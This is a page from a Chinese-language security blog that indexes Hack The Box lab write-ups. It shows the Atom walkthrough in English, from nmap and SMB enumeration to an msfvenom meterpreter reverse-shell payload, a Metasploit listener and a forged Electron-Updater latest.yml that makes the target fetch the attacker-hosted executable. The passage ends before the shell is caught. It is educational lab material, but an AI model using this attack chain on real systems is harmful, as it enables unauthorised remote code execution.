---
title: 客户端、更新器与文档解析
url: https://lucifer11.xyz/knowledge/client/
source: 0xfd's blog
date: 2026-11-25
fetch_date: 2026-11-26T10:13:42.883173
---

# 客户端、更新器与文档解析

![0xfd's blog](/images/fifteen-katana-zero-katana-zero.gif)
[0xfd's blog](/)

by 0xfd

* [首页](/)
* [知识库](/knowledge/)
* [导读](/guide/)
* [分类](/categories/)
* [标签](/tags/)
* [归档](/archives/)
* [关于](/about/)
* 搜索

* 文章目录
* 站点概览

1. [分析重点](#%E5%88%86%E6%9E%90%E9%87%8D%E7%82%B9)
2. [案例与技术索引](#%E6%A1%88%E4%BE%8B%E4%B8%8E%E6%8A%80%E6%9C%AF%E7%B4%A2%E5%BC%95)
3. [更新签名校验与本地应用密文](#%E6%9B%B4%E6%96%B0%E7%AD%BE%E5%90%8D%E6%A0%A1%E9%AA%8C%E4%B8%8E%E6%9C%AC%E5%9C%B0%E5%BA%94%E7%94%A8%E5%AF%86%E6%96%87)
4. [APK 内嵌令牌与验证脚本](#APK-%E5%86%85%E5%B5%8C%E4%BB%A4%E7%89%8C%E4%B8%8E%E9%AA%8C%E8%AF%81%E8%84%9A%E6%9C%AC)
5. [Android 文件服务与调试桥](#Android-%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1%E4%B8%8E%E8%B0%83%E8%AF%95%E6%A1%A5)
6. [元数据解析与图像转换](#%E5%85%83%E6%95%B0%E6%8D%AE%E8%A7%A3%E6%9E%90%E4%B8%8E%E5%9B%BE%E5%83%8F%E8%BD%AC%E6%8D%A2)
7. [Windows IoT 管理接口](#Windows-IoT-%E7%AE%A1%E7%90%86%E6%8E%A5%E5%8F%A3)
8. [APK 请求还原与 sudo 堆溢出](#APK-%E8%AF%B7%E6%B1%82%E8%BF%98%E5%8E%9F%E4%B8%8E-sudo-%E5%A0%86%E6%BA%A2%E5%87%BA)

![253](/images/fifteen-katana-zero-katana-zero.gif)

253

漏洞分析、利用机制、二进制研究与安全工程

[83
日志](/archives/)

[65
分类](/categories/)

[312
标签](/tags/)

GitHub

E-Mail

Twitter

FB Page

YouTube

Instagram

infosec.exchange

![Creative Commons](https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg)

0%

链接

* atsud0
* 记忆里的纯真
* 小离

# 客户端、更新器与文档解析

发表于
2026-11-25

分类于

[漏洞研究](/categories/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/)
，
[客户端与解析器](/categories/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%99%A8/)

阅读次数：

本文字数：
9.6k

阅读时长 ≈
35 分钟

APK、桌面更新器、图像处理和 IoT 管理接口都可能把外部数据带入高权限逻辑。本章从原客户端请求和文件格式出发，保留静态分析、动态抓包、签名判断及实际执行身份。

APK、桌面更新器、图像处理和 IoT 管理接口都可能把外部数据带入高权限逻辑。本章从原客户端请求和文件格式出发，保留静态分析、动态抓包、签名判断及实际执行身份。

[知识库目录](/knowledge/)
[研究导读](/guide/)
[下载 Markdown](/knowledge/client/source.md)
展开全部技术记录

## 分析重点

Atom 的更新签名与 PortableKanban 密文属于两个独立问题。

Catch、RouterSpace 的 APK 分析保留静态与动态两种路径，以及真实 API 的请求格式。

Meta、Explore 和 Omni 分别依赖图像工具、Android 服务和 Windows IoT 的特定环境。

## 案例与技术索引

| 分析入口 | 实验来源 | 技术点 |
| --- | --- | --- |
| [更新签名校验与本地应用密文](#case-atom) | Atom | Electron、更新机制、Redis |
| [APK 内嵌令牌与验证脚本](#case-catch) | catch | Android、API Token、命令注入、CVE-2021-39174 |
| [Android 文件服务与调试桥](#case-explore) | explore | Android、ADB、CVE-2019-6447 |
| [元数据解析与图像转换](#case-meta) | meta | ExifTool、ImageMagick、CVE-2021-22204 |
| [Windows IoT 管理接口](#case-omni) | omni | Windows IoT、Device Portal、PowerShell |
| [APK 请求还原与 sudo 堆溢出](#case-routerspace) | routerspace | Android、命令注入、CVE-2021-3156 |

## 更新签名校验与本地应用密文

可写 SMB 更新目录连接 Electron-Updater 的签名校验缺陷，PortableKanban 与 Redis 中的密文提供后续凭据线索。目录选择与更新文件格式保留在记录中。

来源 Atom · 原记录 2021-04-23 · 22 个代码块 · 7 处图片引用

查看分析过程、攻击步骤与完整代码

#### introduce

OS: Windows
Difficulty: Medium
Points: 30
Release: 17 Apr 2021
IP: 10.10.10.237

* ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1933.jpg)
* ![my htb rank](http://www.hackthebox.eu/badge/image/235857)

#### information gathering

first use nmap as usaul

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 ``` | ``` ┌──(root💀kali)-[~/hackthebox/machine/atom] └─# nmap -sV -v -p- --min-rate=10000 10.10.10.237 PORT     STATE SERVICE      VERSION 80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27) 135/tcp  open  msrpc        Microsoft Windows RPC 443/tcp  open  ssl/http     Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27) 445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) 5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 6379/tcp open  redis        Redis key-value store 7680/tcp open  pando-pub? Service Info: Host: ATOM; OS: Windows; CPE: cpe:/o:microsoft:windows ``` |

#### Port-80

There is a simple html page.

Let’s check https 443 port.

Same page on port 80 and 443 not so interesting.

Now let’s check with smbclient now.

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 ``` | ``` ┌──(root💀kali)-[~/hackthebox/machine/atom] └─# smbclient -L \\10.10.10.237 -U "" Enter WORKGROUP\'s password:           Sharename       Type      Comment         ---------       ----      -------         ADMIN$          Disk      Remote Admin         C$              Disk      Default share         IPC$            IPC       Remote IPC         Software_Updates Disk       SMB1 disabled -- no workgroup available ``` |

We have a interesting share called Software\_Updates let’s check what’s inside.

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 ``` | ``` ┌──(root💀kali)-[~/hackthebox/machine/atom] └─# smbclient -N "\\\\10.10.10.237\Software_Updates" Try "help" to get a list of possible commands. smb: \> ls   .                                   D        0  Fri Apr 23 10:30:59 2021   ..                                  D        0  Fri Apr 23 10:30:59 2021   client1                             D        0  Fri Apr 23 10:30:59 2021   client2                             D        0  Fri Apr 23 10:30:59 2021   client3                             D        0  Fri Apr 23 10:30:59 2021   UAT_Testing_Procedures.pdf          A    35202  Fri Apr  9 07:18:08 2021                  4413951 blocks of size 4096. 1363676 blocks available smb: \> ``` |

Inside folders there is nothing for us. but there is a pdf file. let get this real quick.

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` smb: \> get UAT_Testing_Procedures.pdf getting file \UAT_Testing_Procedures.pdf of size 35202 as UAT_Testing_Procedures.pdf (6.2 KiloBytes/sec) (average 6.2 KiloBytes/sec) ``` |

After reading the pdf i known that we can place the update in any client folder and the automated script check the update.

So if we place the rev shell instead of update so we can get the reverse shell. but for that we need to bypass the “Signature Validation”.

So i search the on google for electron-builder exploit and we got a good blog post.

* Signature Validation Bypass Leading to RCE In Electron-Updater

After reading the blog i understand that how to bypass the Signature and get reverse shell.

I am using msfvenom for creating the reverse shell.

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 ``` | ``` ┌──(root💀kali)-[~/hackthebox/machine/atom] └─# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.3 LPORT=9001 -f exe -o "r'luci.exe" [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x86 from the payload No encoder specified, outputting raw payload Payload size: 354 bytes Final size of exe file: 73802 bytes Saved as: r'luci.exe  ┌──(root💀kali)-[~/hackthebox/machine/atom] └─# shasum -a 512 "r'luci.exe" | cut -d " " -f1 | xxd -r -p | base64 -w 0                                                                          xgDIC+MoZUuufkz10OlxptRGT8HR+z9vxdoL/4FZ/3JMG6NRKz7DK7B69BkolIORVfwDyVnxUUebyHp9vEtbAw== ``` |

We got the hash now let’s start our msfconsole to catch the rev shell.

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 ``` | ``` msf6 > use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp payload => windows/meterpreter/reverse_tcp msf6 exploit(multi/handler) > set LHOST 10.10.14.3 LHOST => 10.10.14.3 msf6 exploit(multi/handler) > set lport 9001 lport => 9001 msf6 exploit(multi/handler) > run  [*] Started reverse TCP handler on 10.10.14.3:9001 ``` |

Now we need to create a file called latest.yml and add our hash inside this file.

* latest.yml

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` version: 1.2.3 path: http://10.10.14.3/r'luci.exe sha512: xgDIC+MoZUuufkz10OlxptRGT8HR+z9vxdoL/4FZ/3JMG6NRKz7DK7B69BkolIORVfwDyVnxUUebyHp9vEtbAw== ``` |

Now start your python3 server on port 80 and we good to go.

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` ┌──(root💀kali)-[~/hackthebox/machine/atom] └─# python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... ``` |

Now last thing...